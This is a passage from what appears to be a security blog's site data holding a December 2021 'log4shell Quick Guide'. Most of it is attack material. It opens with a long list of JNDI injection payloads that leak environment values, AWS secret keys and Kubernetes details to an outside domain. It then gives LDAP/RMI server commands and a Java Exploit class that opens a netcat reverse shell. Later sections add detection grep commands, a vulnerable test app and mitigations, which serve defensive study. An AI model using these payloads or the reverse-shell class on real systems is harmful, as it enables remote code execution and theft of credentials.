12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152${jndi:ldap://${env:user}.domain.com/exp}${jndi:dns://${hostName}.domain.com/a}${jndi:dns://${env:COMPUTERNAME}.domain.com/a}${jndi:dns://${env:USERDOMAIN}.domain.com/a}${jndi:dns://${env:AWS_SECRET_ACCESS_KEY.domain.com/a}${jndi:ldap://${ctx:loginId}.domain.com/j}${jndi:ldap://${map:type}.domain.com/j}${jndi:ldap://${filename}.domain.com/j}${jndi:ldap://${date:MM-dd-yyyy}.domain.com/j}${jndi:ldap://${docker:containerId}.domain.com/j}${jndi:ldap://${docker:containerName}.domain.com/j}${jndi:ldap://${docker:imageName}.domain.com/j}${jndi:ldap://${env:USER}.domain.com/j}${jndi:ldap://${event:Marker}.domain.com/j}${jndi:ldap://${mdc:UserId}.domain.com/j}${jndi:ldap://${java:runtime}.domain.com/j}${jndi:ldap://${java:vm}.domain.com/j}${jndi:ldap://${java:os}.domain.com/j}${jndi:ldap://${jndi:logging/context-name}.domain.com/j}${jndi:ldap://${hostName}.domain.com/j}${jndi:ldap://${docker:containerId}.domain.com/j}${jndi:ldap://${k8s:accountName}.domain.com/j}${jndi:ldap://${k8s:clusterName}.domain.com/j}${jndi:ldap://${k8s:containerId}.domain.com/j}${jndi:ldap://${k8s:containerName}.domain.com/j}${jndi:ldap://${k8s:host}.domain.com/j}${jndi:ldap://${k8s:labels.app}.domain.com/j}${jndi:ldap://${k8s:labels.podTemplateHash}.domain.com/j}${jndi:ldap://${k8s:masterUrl}.domain.com/j}${jndi:ldap://${k8s:namespaceId}.domain.com/j}${jndi:ldap://${k8s:namespaceName}.domain.com/j}${jndi:ldap://${k8s:podId}.domain.com/j}${jndi:ldap://${k8s:podIp}.domain.com/j}${jndi:ldap://${k8s:podName}.domain.com/j}${jndi:ldap://${k8s:imageId}.domain.com/j}${jndi:ldap://${k8s:imageName}.domain.com/j}${jndi:ldap://${log4j:configLocation}.domain.com/j}${jndi:ldap://${log4j:configParentLocation}.domain.com/j}${jndi:ldap://${spring:spring.application.name}.domain.com/j}${jndi:ldap://${main:myString}.domain.com/j}${jndi:ldap://${main:0}.domain.com/j}${jndi:ldap://${main:1}.domain.com/j}${jndi:ldap://${main:2}.domain.com/j}${jndi:ldap://${main:3}.domain.com/j}${jndi:ldap://${main:4}.domain.com/j}${jndi:ldap://${main:bar}.domain.com/j}${jndi:ldap://${name}.domain.com/j}${jndi:ldap://${marker}.domain.com/j}${jndi:ldap://${marker:name}.domain.com/j}${jndi:ldap://${spring:profiles.active[0].domain.com/j}${jndi:ldap://${sys:logPath}.domain.com/j}${jndi:ldap://${web:rootDir}.domain.com/j} 0x03 Exploitation There are a lot diffirent way for exploitation. I will only share two. The following command starts rmiserver,ldap server. It generates jndi links. These links serves java class for performing commands that spesified at C parameter. A is your server-ip that you run ldap&amp;rmi. java -jar JNDInjection.jar -C &quot;nc 192.168.1.XX 1337 -e /bin/sh&quot; -A &quot;192.168.1.XX&quot; This way is a little dirty. The following command starts a ldap server and forwarding requests to spesified url. Because of this you should start a web server and serve the malicious java class over the server. To do this quicly you can use python http.server module. note that the java class must be compatible/supports target’s jdk version. java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.1.XX:1337/#Exploit&quot; python.exe -m http.server 1337 a simple example of java exploit to linux systems. (compile with javac)123456789101112131415161718public class Exploit {public Exploit() {}static { try { Runtime.getRuntime().exec(\"nc 192.168.1.105 1337 -e /bin/sh\"); /* other os String[] cmd = {\"cmd.exe\", \"/c\", \"calc.exe\"}; String[] cmd = {\"open\",\"/System/Applications/Calculator.app\"}; */ }catch (Exception e){ e.printStackTrace(); }}public static void main(String[] args) { Exploit e = new Exploit();}} 0x05 Detection a bash command for quick detection log4shell attempts. It’s involves some waf bypass payloads too. It’s matched all payload that shared by sans in here. 1find / -name \"*.log\" -exec grep \"\\${jndi:ldap\\|\\${\\${::-j}\\|\\${jndi:rmi\\|\\${\\${lower:jndi}\\|\\${\\${lower\\:j}\\${lower:n}\\|\\${\\${lower:j}\\${upper:n}\\|\\${\\${lower:\\${lower:jndi}}:\" {} -n -H --color \\; a bash command for quick detection log4shell attempts in compressed files. 1sudo find / -name \\*.gz -print0 | xargs -0 zgrep -E -i '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+' YARA Rule IOCs 0x06 Test it in your vm:Vulnerable App: log4shell-vuln-app 0x07 burp-extansions burp-extansion burp-extansion-2 burp-extansion-passive 0x08 Mitigations upgrade to log4j-2.1.50.rc2. or in previous releases (&gt;2.10) this behavior can be mitigated by setting system property log4j2.formatMsgNoLookups=true or it can be mitigated in prior releases (&lt;2.10) by removing the JndiLookup class from the classpath. (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class) 0X09 References​big shout out to;lunasec, fastly.com, cyberkendra.com, govcert.ch, @tangxiaofeng7, @christophetd,@shutingrz, @bugbountynights, @BountyOverflow, @ymzkei5, @Neo23x0 0x10 Why this thumbnail?Seraph: The Oracle has many enemies, I had to be sure.Neo: Of what?Seraph: That you were The One.Neo: You could’ve just asked.Seraph: You do not truly know someone until you fight them.","link":"/2021/12/13/log4shell-Quick-Guide/"}],"tags":[{"name":"python","slug":"python","link":"/tags/python/"},{"name":"boolean sqli","slug":"boolean-sqli","link":"/tags/boolean-sqli/"},{"name":"exploit","slug":"exploit","link":"/tags/exploit/"},{"name":"sql-injection","slug":"sql-injection","link":"/tags/sql-injection/"},{"name":"mysql_real_escape_string bypass","slug":"mysql-real-escape-string-bypass","link":"/tags/mysql-real-escape-string-bypass/"},{"name":"addslashes bypass","slug":"addslashes-bypass","link":"/tags/addslashes-bypass/"},{"name":"exploit-tool","slug":"exploit-tool","link":"/tags/exploit-tool/"},{"name":"sqlmap","slug":"sqlmap","link":"/tags/sqlmap/"},{"name":"authentication","slug":"authentication","link":"/tags/authentication/"},{"name":"basic auth","slug":"basic-auth","link":"/tags/basic-auth/"},{"name":"brute-force","slug":"brute-force","link":"/tags/brute-force/"},{"name":"burp","slug":"burp","link":"/tags/burp/"},{"name":"burp suite","slug":"burp-suite","link":"/tags/burp-suite/"},{"name":"HTTPBasicAuth","slug":"HTTPBasicAuth","link":"/tags/HTTPBasicAuth/"},{"name":"requests","slug":"requests","link":"/tags/requests/"},{"name":"http lib","slug":"http-lib","link":"/tags/http-lib/"},{"name":"request","slug":"request","link":"/tags/request/"},{"name":"python http requests","slug":"python-http-requests","link":"/tags/python-http-requests/"},{"name":"log4shell","slug":"log4shell","link":"/tags/log4shell/"},{"name":"log4j","slug":"log4j","link":"/tags/log4j/"},{"name":"log4shell-detection","slug":"log4shell-detection","link":"/tags/log4shell-detection/"},{"name":"log4shell-bypass","slug":"log4shell-bypass","link":"/tags/log4shell-bypass/"},{"name":"log4shell-exploit","slug":"log4shell-exploit","link":"/tags/log4shell-exploit/"},{"name":"log4shell-mitigation","slug":"log4shell-mitigation","link":"/tags/log4shell-mitigation/"}],"categories":[{"name":"Web Securıty","slug":"Web-Security","link":"/categories/Web-Security/"},{"name":"Programmıng","slug":"Programming","link":"/categories/Programming/"},{"name":"Application Security","slug":"Application-Security","link":"/categories/Application-Security/"}]}